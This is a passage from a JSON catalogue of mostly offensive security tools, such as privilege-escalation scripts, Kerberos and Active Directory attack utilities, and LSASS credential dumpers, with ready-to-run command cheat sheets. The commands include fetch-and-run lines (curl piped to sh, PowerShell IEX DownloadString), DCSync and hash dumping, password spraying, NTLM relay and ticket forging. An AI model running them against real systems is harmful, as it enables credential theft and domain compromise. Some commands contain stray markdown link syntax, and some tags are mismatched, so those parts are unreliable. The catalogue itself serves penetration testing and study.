    "details": "## Description\nSQLFluff is a dialect-flexible and configurable SQL linter. While primarily for code quality, it helps identify bad practices and maintain clean SQL code.\n\n## Setup\n```bash\npip install sqlfluff\n```\n\n## Usage\nRun against SQL files to check for syntax errors and formatting issues.\n\n## Useful Commands\n```bash\n# Lint a file\nsqlfluff lint query.sql\n\n# Fix issues automatically\nsqlfluff fix query.sql\n```\n\n## Alternatives\n- **SQLfmt**",
    "source": "https://github.com/sqlfluff/sqlfluff",
    "binaries": null,
    "tags": [
      "tool"
    ]
  },
  {
    "name": "LinPEAS / WinPEAS",
    "url": "https://github.com/peass-ng/PEASS-ng",
    "cat": "red",
    "type": "tool",
    "desc": "Privilege escalation audit scripts",
    "details": "## Description\nPEASS-ng (Privilege Escalation Awesome Scripts Suite) are scripts that search for possible paths to escalate privileges on Linux/Windows/Mac hosts.\n\n## Setup\nDownload the script (sh/bat/exe) directly from releases to the target machine.\n\n## Usage\nRun the script on a compromised host to get a colored output highlighting vulnerabilities (red/yellow).\n\n## Useful Commands\n```bash\n# Linux (curl piping)\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Windows\n.\\winpeas.exe cmd fast\n```\n\n## Alternatives\n- **LinEnum**\n- **Seatbelt**",
    "source": "https://github.com/peass-ng/PEASS-ng",
    "binaries": "https://github.com/peass-ng/PEASS-ng/releases",
    "tags": [
      "post-exploitation",
      "privilege escalation",
      "exploitation"
    ]
  },
  {
    "name": "pspy",
    "url": "https://github.com/DominicBreuker/pspy",
    "cat": "red",
    "type": "tool",
    "desc": "Monitor processes without root (Linux)",
    "details": "## Description\npspy is a command-line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they happen.\n\n## Setup\nDownload the static binary (`pspy32` or `pspy64`) to the target machine.\n```bash\nwget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64\nchmod +x pspy64\n```\n\n## Usage\nExecute on a Linux host to monitor real-time process creation events.\n\n## Useful Commands\n```bash\n# Run and watch for events\n./pspy64\n\n# Watch specific directories\n./pspy64 -f -r /var/www/html\n```\n\n## Alternatives\n- **auditd** (requires root)",
    "source": "https://github.com/DominicBreuker/pspy",
    "binaries": "https://github.com/DominicBreuker/pspy/releases",
    "tags": [
      "web",
      "malware analysis"
    ]
  },
  {
    "name": "John the Ripper",
    "url": "https://www.openwall.com/john/",
    "cat": "red",
    "type": "tool",
    "desc": "Password audit and recovery",
    "details": "## Description\nJohn the Ripper is a fast password cracker. Its primary purpose is to detect weak Unix passwords, but it supports hundreds of hash and cipher types.\n\n## Setup\n```bash\nsudo apt install john\n# Or build 'Jumbo' version from source for more formats\n```\n\n## Usage\nProvide it with a file containing hashes and optionally a wordlist. It will attempt to crack them offline.\n\n## Useful Commands\n```bash\n# Convert file to john format\nzip2john file.zip > hash.txt\n\n# Crack hash with wordlist\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\n# Show cracked passwords\njohn --show hash.txt\n```\n\n## Alternatives\n- **Hashcat**",
    "source": "https://github.com/openwall/john",
    "binaries": "https://github.com/openwall/john-packages/releases",
    "tags": [
      "credential access",
      "wordlist"
    ]
  },
  {
    "name": "hashcat",
    "url": "https://hashcat.net/hashcat/",
    "cat": "red",
    "type": "tool",
    "desc": "GPU password auditing tool",
    "details": "## Description\nHashcat is the world's fastest and most advanced password recovery utility. It relies on the power of the GPU to crack hashes at high speeds.\n\n## Setup\n```bash\nsudo apt install hashcat\n# For best performance, download binary from site to use GPU drivers\n```\n\n## Usage\nDetermine the hash mode (number) and run it against a wordlist or using rules.\n\n## Useful Commands\n```bash\n# MD5 crack (Mode 0)\nhashcat -m 0 -a 0 hash.txt wordlist.txt\n\n# WPA2 crack (Mode 2500)\nhashcat -m 2500 capture.hccapx wordlist.txt\n```\n\n## Alternatives\n- **John the Ripper**",
    "source": "https://github.com/hashcat/hashcat",
    "binaries": "https://hashcat.net/hashcat/",
    "tags": [
      "credential access",
      "malware analysis",
      "wordlist"
    ]
  },
  {
    "name": "Enum4linux-ng",
    "url": "https://github.com/cddmp/enum4linux-ng",
    "cat": "red",
    "type": "tool",
    "desc": "SMB enumeration helper",
    "details": "## Description\nEnum4linux-ng is a rewrite of the legacy enum4linux tool. It automates SMB enumeration (users, shares, policies) using tools like smbclient, rpcclient, and net.\n\n## Setup\n```bash\ngit clone https://github.com/cddmp/enum4linux-ng.git\npip install -r requirements.txt\n```\n\n## Usage\nTarget a Windows or Samba host to extract information via SMB/RPC.\n\n## Useful Commands\n```bash\n# Standard scan\n./enum4linux-ng.py 10.10.10.10 -A\n\n# Export to YAML/JSON\n./enum4linux-ng.py 10.10.10.10 -oJ output.json\n```\n\n## Alternatives\n- **NetExec**\n- **WalkSMB**",
    "source": "https://github.com/cddmp/enum4linux-ng",
    "binaries": null,
    "tags": [
      "enumeration",
      "scanning",
      "web"
    ]
  },
  {
    "name": "Kerbrute",
    "url": "https://github.com/ropnop/kerbrute",
    "cat": "red",
    "type": "tool",
    "desc": "Kerberos user enumeration",
    "details": "## Description\nKerbrute is a tool to perform Kerberos Pre-auth bruteforcing. It is faster and stealthier than NTLM bruteforcing and does not lock accounts if used for enumeration only.\n\n## Setup\nDownload the compiled binary from releases.\n\n## Usage\nUse it to validate a list of usernames against a Domain Controller.\n\n## Useful Commands\n```bash\n# Enumerate valid users from a list\n./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 users.txt\n\n# Password spray\n./kerbrute_linux_amd64 passwordspray -d domain.local passwords.txt Password123\n```\n\n## Alternatives\n- **Rubeus** (Windows)",
    "source": "https://github.com/ropnop/kerbrute",
    "binaries": "https://github.com/ropnop/kerbrute/releases",
    "tags": [
      "credential access",
      "enumeration",
      "malware analysis"
    ]
  },
  {
    "name": "Certipy",
    "url": "https://github.com/ly4k/Certipy",
    "cat": "red",
    "type": "tool",
    "desc": "Active Directory Certificate Services assessment",
    "details": "## Description\nCertipy is a tool for enumerating and abusing Active Directory Certificate Services (AD CS). It simplifies the process of finding vulnerable certificate templates.\n\n## Setup\n```bash\npip3 install certipy-ad\n```\n\n## Usage\nUse it to dump certificate configurations, find vulnerabilities (like ESC1), and request certificates for exploitation.\n\n## Useful Commands\n```bash\n# Find vulnerable templates\ncertipy find -u user@domain.local -p pass -dc-ip 10.10.10.10\n\n# Request a certificate\ncertipy req -u user@domain.local -p pass -ca CA-Name -template VulnTemplate\n```\n\n## Alternatives\n- **Certify** (C#)",
    "source": "https://github.com/ly4k/Certipy",
    "binaries": null,
    "tags": [
      "exploitation",
      "active directory"
    ]
  },
  {
    "name": "Ghidra",
    "url": "https://ghidra-sre.org/",
    "cat": "red",
    "type": "tool",
    "desc": "Reverse engineering suite",
    "details": "## Description\nGhidra is a software reverse engineering (SRE) suite of tools developed by NSA's Research Directorate. It is used for analyzing compiled code (malware or binaries).\n\n## Setup\nRequires JDK 17+. Download zip, extract, and run `./ghidraRun`.\n\n## Usage\nImport a binary to disassemble and decompile it. It provides a visual graph of code flow and pseudo-code generation.\n\n## Features\n- **Disassembler:** View assembly.\n- **Decompiler:** View pseudo-C code (highly readable).\n- **Graph View:** Visualize control flow.\n\n## Alternatives\n- **IDA Pro**\n- **Radare2**",
    "source": "https://github.com/NationalSecurityAgency/ghidra",
    "binaries": "https://github.com/NationalSecurityAgency/ghidra/releases",
    "tags": [
      "malware analysis",
      "framework"
    ]
  },
  {
    "name": "radare2",
    "url": "https://rada.re/n/",
    "cat": "red",
    "type": "tool",
    "desc": "Reverse engineering framework",
    "details": "## Description\nradare2 is a portable reversing framework. It is CLI-based, scriptable, and supports many architectures.\n\n## Setup\n```bash\ngit clone https://github.com/radareorg/radare2\nradare2/sys/install.sh\n```\n\n## Usage\nUse it to open binaries, analyze code structures, patch bytes, and debug applications.\n\n## Useful Commands\n```bash\n# Open binary\nr2 ./binary\n\n# Inside r2:\naaa       # Analyze all\npdf       # Print disassembly function\niz        # List strings\n```\n\n## Alternatives\n- **Ghidra**\n- **Cutter** (GUI for r2)",
    "source": "https://github.com/radareorg/radare2",
    "binaries": "https://github.com/radareorg/radare2/releases",
    "tags": [
      "web",
      "malware analysis",
      "framework"
    ]
  },
  {
    "name": "Frida",
    "url": "https://frida.re/",
    "cat": "red",
    "type": "tool",
    "desc": "Dynamic instrumentation (mobile/app testing)",
    "details": "## Description\nFrida is a dynamic code instrumentation toolkit. It lets you inject snippets of JavaScript or your own library into native apps on Windows, macOS, Linux, iOS, Android, and QNX.\n\n## Setup\n```bash\npip install frida-tools\n# For mobile, download frida-server binary to device\n```\n\n## Usage\nConnect to a running process to hook functions, trace execution, or modify logic on the fly.\n\n## Useful Commands\n```bash\n# List running processes\nfrida-ps -U\n\n# Trace a function\nfrida-trace -U -i \"open*\" com.target.app\n```\n\n## Alternatives\n- **Objection** (Runtime Mobile Exploration)",
    "source": "https://github.com/frida/frida",
    "binaries": "https://github.com/frida/frida/releases",
    "tags": [
      "malware analysis",
      "mobile"
    ]
  },
  {
    "name": "MobSF",
    "url": "https://mobsf.github.io/docs/",
    "cat": "red",
    "type": "tool",
    "desc": "Mobile security testing framework",
    "details": "## Description\nMobSF (Mobile Security Framework) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework.\n\n## Setup\nThe easiest way is Docker:\n```bash\ndocker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\n```\n\n## Usage\nRun the web interface, upload an APK or IPA file, and it will perform static and dynamic analysis to generate a report.\n\n## Workflow\n1. Run MobSF.\n2. Navigate to `http://localhost:8000`.\n3. Drag and drop `.apk` or `.ipa` file.\n\n## Alternatives\n- **QARK**",
    "source": "https://github.com/MobSF/Mobile-Security-Framework-MobSF",
    "binaries": null,
    "tags": [
      "web",
      "malware analysis",
      "containers"
    ]
  },
  {
    "name": "gowitness",
    "url": "https://github.com/sensepost/gowitness",
    "cat": "red",
    "type": "tool",
    "desc": "Screenshot and report web targets",
    "details": "## Description\ngowitness is a golang, web screenshot utility using Chrome Headless. It is useful for visual reconnaissance of large lists of URLs.\n\n## Setup\n```bash\ngo install [github.com/sensepost/gowitness@latest](https://github.com/sensepost/gowitness@latest)\n```\n\n## Usage\nFeed it a list of URLs, and it will save screenshots and header information to a database and generate a report.\n\n## Useful Commands\n```bash\n# Screenshot a single URL\ngowitness single --url https://example.com\n\n# Screenshot a list of URLs\ngowitness file -f urls.txt\n\n# Start report server\ngowitness report serve\n```\n\n## Alternatives\n- **EyeWitness**\n- **Aquatone**",
    "source": "https://github.com/sensepost/gowitness",
    "binaries": "https://github.com/sensepost/gowitness/releases",
    "tags": [
      "enumeration",
      "web",
      "database"
    ]
  },
  {
    "name": "EyeWitness",
    "url": "https://github.com/FortyNorthSecurity/EyeWitness",
    "cat": "red",
    "type": "tool",
    "desc": "Web target screenshotting and reporting",
    "details": "## Description\nEyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if known.\n\n## Setup\n```bash\ngit clone https://github.com/FortyNorthSecurity/EyeWitness.git\ncd EyeWitness/Python/setup && ./setup.sh\n```\n\n## Usage\nIt is used to triage a large number of web services to determine which ones are worth further investigation.\n\n## Useful Commands\n```bash\n# Scan list of URLs\n./EyeWitness.py -f urls.txt --web\n```\n\n## Alternatives\n- **gowitness**",
    "source": "https://github.com/FortyNorthSecurity/EyeWitness",
    "binaries": null,
    "tags": [
      "scanning",
      "web"
    ]
  },
  {
    "name": "WhatWeb",
    "url": "https://github.com/urbanadventurer/WhatWeb",
    "cat": "red",
    "type": "tool",
    "desc": "Website fingerprinting",
    "details": "## Description\nWhatWeb identifies websites. It recognizes web technologies including CMS, blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.\n\n## Setup\n```bash\nsudo apt install whatweb\n```\n\n## Usage\nRun against a URL to identify the underlying technologies and versions.\n\n## Useful Commands\n```bash\n# Standard scan\nwhatweb example.com\n\n# Aggressive scan (more intrusive)\nwhatweb -a 3 example.com\n```\n\n## Alternatives\n- **Wappalyzer**\n- **httpx**",
    "source": "https://github.com/urbanadventurer/WhatWeb",
    "binaries": null,
    "tags": [
      "enumeration",
      "scanning",
      "web"
    ]
  },
  {
    "name": "testssl.sh",
    "url": "https://testssl.sh/",
    "cat": "red",
    "type": "tool",
    "desc": "TLS/SSL configuration tester",
    "details": "## Description\ntestssl.sh is a free command line tool which checks a server's service on any port for the support of TLS/SSL ciphers, protocols as well as some cryptographic flaws.\n\n## Setup\n```bash\ngit clone --depth 1 https://github.com/drwetter/testssl.sh.git\ncd testssl.sh\nchmod +x testssl.sh\n```\n\n## Usage\nIt does not rely on third-party libraries (only bash and openssl) to perform deep analysis of SSL/TLS configurations.\n\n## Useful Commands\n```bash\n# Test a site and output HTML\n./testssl.sh --htmlfile report.html https://example.com\n```\n\n## Alternatives\n- **sslyze**\n- **SSL Labs**",
    "source": "https://github.com/drwetter/testssl.sh",
    "binaries": "https://github.com/drwetter/testssl.sh/releases",
    "tags": [
      "scanning",
      "web"
    ]
  },
  {
    "name": "sslyze",
    "url": "https://github.com/nabla-c0d3/sslyze",
    "cat": "red",
    "type": "tool",
    "desc": "Fast TLS configuration scanner",
    "details": "## Description\nSSLyze is a fast and powerful SSL/TLS scanning library. It helps to analyze the SSL configuration of a server.\n\n## Setup\n```bash\npip install sslyze\n```\n\n## Usage\nUse it to check for weak ciphers, expired certificates, and outdated protocols.\n\n## Useful Commands\n```bash\n# Scan target\nsslyze --regular [www.example.com](https://www.example.com)\n```\n\n## Alternatives\n- **testssl.sh**",
    "source": "https://github.com/nabla-c0d3/sslyze",
    "binaries": null,
    "tags": [
      "scanning",
      "web"
    ]
  },
  {
    "name": "ADRecon",
    "url": "https://github.com/sense-of-security/ADRecon",
    "cat": "red",
    "type": "tool",
    "desc": "Active Directory reconnaissance and reporting",
    "details": "## Description\nADRecon is a tool which extracts and combines various artifacts from an AD environment. The information can be presented in specially formatted Excel reports that include summary views with metrics.\n\n## Setup\n```powershell\n# Run directly from PowerShell\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1')\n```\n\n## Usage\nRun on a domain-joined machine to generate comprehensive AD reports in Excel format.\n\n## Useful Commands\n```powershell\n# Generate report for current domain\n.\\ADRecon.ps1\n\n# Generate report with credentials\n.\\ADRecon.ps1 -DomainController dc01.domain.local -Credential domain\\user\n\n# Output to specific directory\n.\\ADRecon.ps1 -OutputDir C:\\Temp\\ADRecon\n```\n\n## Alternatives\n- **BloodHound**\n- **PingCastle**",
    "source": "https://github.com/sense-of-security/ADRecon",
    "binaries": null,
    "tags": [
      "credential access",
      "active directory",
      "enumeration"
    ]
  },
  {
    "name": "SharpHound",
    "url": "https://github.com/BloodHoundAD/SharpHound",
    "cat": "red",
    "type": "tool",
    "desc": "BloodHound data collector (C#)",
    "details": "## Description\nSharpHound is the official data collector for BloodHound. It collects Active Directory data including users, groups, computers, sessions, ACLs, and GPOs.\n\n## Setup\nDownload the compiled executable from BloodHound releases.\n\n## Usage\nRun on a domain-joined Windows machine to collect AD data for import into BloodHound.\n\n## Useful Commands\n```cmd\n# Collect all data\nSharpHound.exe -c All\n\n# Collect specific methods\nSharpHound.exe -c DCOnly,Session,LoggedOn\n\n# Use LDAP only (stealth)\nSharpHound.exe -c All --CollectionMethod LDAP\n\n# Specify domain\nSharpHound.exe -d domain.local -c All\n```\n\n## Alternatives\n- **BloodHound.py** (Python collector)\n- **AzureHound** (Azure AD)",
    "source": "https://github.com/BloodHoundAD/SharpHound",
    "binaries": "https://github.com/BloodHoundAD/SharpHound/releases",
    "tags": [
      "active directory",
      "cloud"
    ]
  },
  {
    "name": "Impacket-GetUserSPNs",
    "url": "https://github.com/fortra/impacket",
    "cat": "red",
    "type": "tool",
    "desc": "Kerberoasting from Linux",
    "details": "## Description\nGetUserSPNs.py is an Impacket script that finds Service Principal Names and requests their TGS tickets for offline cracking (Kerberoasting).\n\n## Setup\n```bash\npip install impacket\n```\n\n## Usage\nRun from a Linux machine with network access to the domain to perform Kerberoasting attacks.\n\n## Useful Commands\n```bash\n# Request all Kerberoastable tickets\nGetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request\n\n# Output to hashcat format\nGetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile kerberoast.txt\n\n# Use NTLM hash\nGetUserSPNs.py -hashes :ntlmhash domain.local/user@dc.domain.local -request\n```\n\n## Alternatives\n- **Rubeus** (Windows)\n- **Invoke-Kerberoast**",
    "source": "https://github.com/fortra/impacket",
    "binaries": null,
    "tags": [
      "credential access",
      "network"
    ]
  },
  {
    "name": "Impacket-GetNPUsers",
    "url": "https://github.com/fortra/impacket",
    "cat": "red",
    "type": "tool",
    "desc": "AS-REP Roasting from Linux",
    "details": "## Description\nGetNPUsers.py attempts to list and get TGTs for users that have the property 'Do not require Kerberos preauthentication' set (AS-REP Roasting).\n\n## Setup\n```bash\npip install impacket\n```\n\n## Usage\nEnumerate and exploit accounts with Kerberos pre-authentication disabled.\n\n## Useful Commands\n```bash\n# Request AS-REP hashes for all vulnerable users\nGetNPUsers.py domain.local/ -dc-ip 10.10.10.10 -request\n\n# Check specific user\nGetNPUsers.py domain.local/username -dc-ip 10.10.10.10 -no-pass\n\n# Use userlist\nGetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat\n```\n\n## Alternatives\n- **Rubeus asreproast**",
    "source": "https://github.com/fortra/impacket",
    "binaries": null,
    "tags": [
      "exploitation",
      "credential access"
    ]
  },
  {
    "name": "Impacket-secretsdump",
    "url": "https://github.com/fortra/impacket",
    "cat": "red",
    "type": "tool",
    "desc": "Dump secrets from Windows systems",
    "details": "## Description\nsecretsdump.py performs various techniques to dump secrets from the remote machine without executing any agent there. Techniques include reading SAM, LSA secrets, and performing DCSync attacks.\n\n## Setup\n```bash\npip install impacket\n```\n\n## Usage\nExtract credentials from domain controllers or local machines.\n\n## Useful Commands\n```bash\n# DCSync attack (dump all hashes)\nsecretsdump.py domain.local/user:password@dc.domain.local\n\n# Dump local SAM\nsecretsdump.py -sam sam.save -system system.save LOCAL\n\n# Use NTLM hash\nsecretsdump.py -hashes :ntlmhash domain.local/Administrator@10.10.10.10\n\n# Dump specific user\nsecretsdump.py domain.local/user:password@dc.domain.local -just-dc-user Administrator\n```\n\n## Alternatives\n- **Mimikatz (DCSync)**\n- **NetExec**",
    "source": "https://github.com/fortra/impacket",
    "binaries": null,
    "tags": [
      "credential access"
    ]
  },
  {
    "name": "Impacket-ntlmrelayx",
    "url": "https://github.com/fortra/impacket",
    "cat": "red",
    "type": "tool",
    "desc": "NTLM relay attack tool",
    "details": "## Description\nntlmrelayx.py performs NTLM relay attacks by setting up an SMB and HTTP server and relaying credentials to other protocols (SMB, LDAP, MSSQL, etc.).\n\n## Setup\n```bash\npip install impacket\n```\n\n## Usage\nCapture NTLM authentication attempts and relay them to target systems for authentication.\n\n## Useful Commands\n```bash\n# Basic SMB relay\nntlmrelayx.py -tf targets.txt -smb2support\n\n# Relay to LDAP and dump domain info\nntlmrelayx.py -t ldap://dc.domain.local --dump-adcs --dump-laps\n\n# Execute command via SMB relay\nntlmrelayx.py -tf targets.txt -smb2support -c \"whoami\"\n\n# Relay to create new computer account\nntlmrelayx.py -t ldaps://dc.domain.local --delegate-access\n```\n\n## Alternatives\n- **MultiRelay**\n- **Responder + ntlmrelayx combo**",
    "source": "https://github.com/fortra/impacket",
    "binaries": null,
    "tags": [
      "credential access",
      "active directory",
      "web"
    ]
  },
  {
    "name": "Impacket-getST",
    "url": "https://github.com/fortra/impacket",
    "cat": "red",
    "type": "tool",
    "desc": "Request Kerberos service tickets",
    "details": "## Description\ngetST.py will request a Service Ticket (ST) and save it as ccache. It supports various Kerberos authentication methods including S4U2Self and S4U2Proxy.\n\n## Setup\n```bash\npip install impacket\n```\n\n## Usage\nRequest service tickets for impersonation attacks and constrained delegation exploitation.\n\n## Useful Commands\n```bash\n# Request ST with password\ngetST.py domain.local/user:password -spn cifs/target.domain.local\n\n# S4U2Self attack\ngetST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/serviceaccount:password\n\n# Use with hash\ngetST.py -spn cifs/target.domain.local -hashes :ntlmhash domain.local/user\n```\n\n## Alternatives\n- **Rubeus s4u**",
    "source": "https://github.com/fortra/impacket",
    "binaries": null,
    "tags": [
      "exploitation",
      "credential access"
    ]
  },
  {
    "name": "Impacket-ticketer",
    "url": "https://github.com/fortra/impacket",
    "cat": "red",
    "type": "tool",
    "desc": "Create Kerberos Golden/Silver tickets",
    "details": "## Description\nticketer.py creates Golden Tickets (TGT) and Silver Tickets (TGS) for Kerberos ticket attacks.\n\n## Setup\n```bash\npip install impacket\n```\n\n## Usage\nForge Kerberos tickets using compromised credentials (usually krbtgt hash for Golden Ticket).\n\n## Useful Commands\n```bash\n# Create Golden Ticket\nticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain domain.local Administrator\n\n# Create Silver Ticket for CIFS\nticketer.py -nthash <service_hash> -domain-sid <domain_sid> -domain domain.local -spn cifs/target.domain.local Administrator\n\n# Use ticket\nexport KRB5CCNAME=Administrator.ccache\npsexec.py domain.local/Administrator@target.domain.local -k -no-pass\n```\n\n## Alternatives\n- **Mimikatz (kerberos::golden)**",
    "source": "https://github.com/fortra/impacket",
    "binaries": null,
    "tags": [
      "credential access"
    ]
  },
  {
    "name": "pypykatz",
    "url": "https://github.com/skelsec/pypykatz",
    "cat": "red",
    "type": "tool",
    "desc": "Mimikatz implementation in Python",
    "details": "## Description\npypykatz is a Python implementation of Mimikatz. It can parse LSASS dumps and extract credentials without running on Windows.\n\n## Setup\n```bash\npip install pypykatz\n```\n\n## Usage\nParse LSASS memory dumps or live LSASS process (with privileges) to extract credentials.\n\n## Useful Commands\n```bash\n# Parse LSASS dump file\npypykatz lsa minidump lsass.dmp\n\n# Live dump (requires admin/SYSTEM)\npypykatz live lsa\n\n# Parse registry hives\npypykatz registry --sam sam.save --system system.save\n```\n\n## Alternatives\n- **Mimikatz**\n- **lsassy**",
    "source": "https://github.com/skelsec/pypykatz",
    "binaries": null,
    "tags": [
      "credential access",
      "forensics"
    ]
  },
  {
    "name": "lsassy",
    "url": "https://github.com/Hackndo/lsassy",
    "cat": "red",
    "type": "tool",
    "desc": "Remote LSASS credential extraction",
    "details": "## Description\nlsassy is a tool to remotely extract credentials from LSASS memory. It can dump LSASS remotely, parse the dump using pypykatz, and clean up.\n\n## Setup\n```bash\npip install lsassy\n```\n\n## Usage\nExtract credentials from remote Windows machines without manually dumping LSASS.\n\n## Useful Commands\n```bash\n# Dump single host\nlsassy -u Administrator -p Password123 -d domain.local 10.10.10.10\n\n# Use hash\nlsassy -u Administrator -H ntlmhash -d domain.local 10.10.10.10\n\n# Dump multiple hosts from file\nlsassy -u Administrator -p Password123 -d domain.local -tf targets.txt\n```\n\n## Alternatives\n- **CrackMapExec --lsa**\n- **NetExec**",
    "source": "https://github.com/Hackndo/lsassy",
    "binaries": null,
    "tags": [
      "credential access",
      "forensics"
    ]
  },
  {
    "name": "ADCSPwn",
    "url": "https://github.com/bats3c/ADCSPwn",
    "cat": "red",
    "type": "tool",
    "desc": "ADCS relay attack tool",
    "details": "## Description\nADCSPwn is a tool to escalate privileges in an Active Directory network by coercing authentication from machine accounts and relaying to the certificate service.\n\n## Setup\n```bash\ngit clone https://github.com/bats3c/ADCSPwn\ncd ADCSPwn\npip install -r requirements.txt\n```\n\n## Usage\nExploit ADCS (Active Directory Certificate Services) through NTLM relay attacks.\n\n## Useful Commands\n```bash\n# Basic relay attack\npython ADCSPwn.py --target ca.domain.local --attacker 10.10.10.10\n\n# Specify template\npython ADCSPwn.py --target ca.domain.local --attacker 10.10.10.10 --template Machine\n```\n\n## Alternatives\n- **Certipy**\n- **ntlmrelayx.py (with ADCS)**",
    "source": "https://github.com/bats3c/ADCSPwn",
    "binaries": null,
    "tags": [
      "exploitation",
      "credential access",
      "active directory"
    ]
  },
  {
    "name": "PKINITtools",
    "url": "https://github.com/dirkjanm/PKINITtools",
    "cat": "red",
    "type": "tool",
    "desc": "Kerberos PKINIT manipulation tools",
    "details": "## Description\nPKINITtools are tools for Kerberos PKINIT and UnPAC-the-hash attacks. Useful for exploiting certificate-based authentication in Active Directory.\n\n## Setup\n```bash\npip install minikerberos\ngit clone https://github.com/dirkjanm/PKINITtools\n```\n\n## Usage\nAuthenticate using certificates and perform UnPAC-the-hash to recover NTLM hash from Kerberos tickets.\n\n## Useful Commands\n```bash\n# Get TGT using certificate\npython gettgtpkinit.py domain.local/user -cert-pfx user.pfx -dc-ip 10.10.10.10 user.ccache\n\n# Extract NTLM hash from PAC\npython getnthash.py domain.local/user -key <AS-REP-key> -dc-ip 10.10.10.10\n```\n\n## Alternatives\n- **Rubeus (asktgt /certificate)**\n- **Certipy auth**",
    "source": "https://github.com/dirkjanm/PKINITtools",
    "binaries": null,
    "tags": [
      "credential access",
      "active directory",
      "web"
    ]
  },
  {
    "name": "Certify",
    "url": "https://github.com/GhostPack/Certify",
    "cat": "red",
    "type": "tool",
    "desc": "AD CS enumeration and abuse (C#)",
    "details": "## Description\nCertify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).\n\n## Setup\nCompile from source or download pre-built binary.\n\n## Usage\nFind vulnerable certificate templates and request certificates for privilege escalation.\n\n## Useful Commands\n```cmd\n# Find vulnerable templates\nCertify.exe find /vulnerable\n\n# Request certificate with ESC1\nCertify.exe request /ca:CA-SERVER\\CA-NAME /template:VulnTemplate /altname:Administrator\n\n# Download issued certificate\nCertify.exe download /ca:CA-SERVER\\CA-NAME /id:12345\n```\n\n## Alternatives\n- **Certipy** (Python)",
    "source": "https://github.com/GhostPack/Certify",
    "binaries": null,
    "tags": [
      "privilege escalation",
      "post-exploitation",
      "active directory"
    ]
  },
  {
    "name": "SharpCollection",
    "url": "https://github.com/Flangvik/SharpCollection",
    "cat": "red",
    "type": "tool",
    "desc": "Pre-compiled .NET offensive tools",
    "details": "## Description\nSharpCollection is a repository of pre-compiled, offensive C# tools. Saves time by providing ready-to-use binaries of popular offensive tools.\n\n## Setup\nDownload from repository or clone.\n\n## Usage\nAccess various Sharp* tools like SharpHound, SharpView, Seatbelt, SharpUp, etc. without compiling.\n\n## Tools Included\n- **SharpHound** - BloodHound collector\n- **Seatbelt** - Security enumeration\n- **SharpUp** - Privilege escalation checks\n- **SharpView** - AD enumeration\n- **SharpDPAPI** - DPAPI abuse\n- And many more...\n\n## Alternatives\n- **Compile from source**",
    "source": "https://github.com/Flangvik/SharpCollection",
    "binaries": "https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_x64",
    "tags": [
      "privilege escalation",
      "post-exploitation",
      "active directory"
    ]
  },
  {
    "name": "Seatbelt",
    "url": "https://github.com/GhostPack/Seatbelt",
    "cat": "red",
    "type": "tool",
    "desc": "Windows host enumeration (C#)",
    "details": "## Description\nSeatbelt is a C# project that performs a number of security-oriented host-survey checks relevant from both offensive and defensive security perspectives.\n\n## Setup\nDownload compiled binary or build from source.\n\n## Usage\nRun on Windows machines to perform comprehensive security enumeration.\n\n## Useful Commands\n```cmd\n# Run all checks\nSeatbelt.exe -group=all\n\n# Run user checks\nSeatbelt.exe -group=user\n\n# Run system checks\nSeatbelt.exe -group=system\n\n# Specific checks\nSeatbelt.exe AntiVirus EnvironmentVariables InterestingFiles\n```\n\n## Alternatives\n- **WinPEAS**\n- **PowerUp**",
    "source": "https://github.com/GhostPack/Seatbelt",
    "binaries": null,
    "tags": [
      "post-exploitation",
      "privilege escalation",
      "exploitation"
    ]
  },
  {
    "name": "SharpUp",
    "url": "https://github.com/GhostPack/SharpUp",
    "cat": "red",
    "type": "tool",
    "desc": "Windows privilege escalation checks (C#)",
    "details": "## Description\nSharpUp is a C# port of various PowerUp functionality. It checks for common Windows privilege escalation vectors.\n\n## Setup\nDownload binary or compile from source.\n\n## Usage\nRun to identify privilege escalation opportunities on Windows systems.\n\n## Useful Commands\n```cmd\n# Run all checks\nSharpUp.exe audit\n\n# Specific checks only\nSharpUp.exe audit AlwaysInstallElevated ModifiableServices\n```\n\n## Alternatives\n- **PowerUp**\n- **WinPEAS**",
    "source": "https://github.com/GhostPack/SharpUp",
    "binaries": null,
    "tags": [
      "post-exploitation",
      "privilege escalation",
      "exploitation"
    ]
  },
  {
    "name": "Inveigh",
    "url": "https://github.com/Kevin-Robertson/Inveigh",
    "cat": "red",
    "type": "tool",
    "desc": "Windows LLMNR/NBNS/mDNS/DNS spoofer",
    "details": "## Description\nInveigh is a PowerShell and C# LLMNR/NBNS/mDNS/DNS spoofer and man-in-the-middle tool. Windows alternative to Responder.\n\n## Setup\n```powershell\n# PowerShell version\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')\n```\n\n## Usage\nCapture NTLM hashes by poisoning name resolution protocols on Windows networks.\n\n## Useful Commands\n```powershell\n# Start Inveigh\nInvoke-Inveigh -ConsoleOutput Y\n\n# View captured hashes\nGet-Inveigh\n\n# Stop Inveigh\nStop-Inveigh\n```\n\n## Alternatives\n- **Responder** (Linux)",
    "source": "https://github.com/Kevin-Robertson/Inveigh",
    "binaries": null,
    "tags": [
      "credential access",
      "web",
      "dns"
    ]
  },
  {
    "name": "Invoke-TheHash",
    "url": "https://github.com/Kevin-Robertson/Invoke-TheHash",
    "cat": "red",
    "type": "tool",
    "desc": "PowerShell pass-the-hash tools",
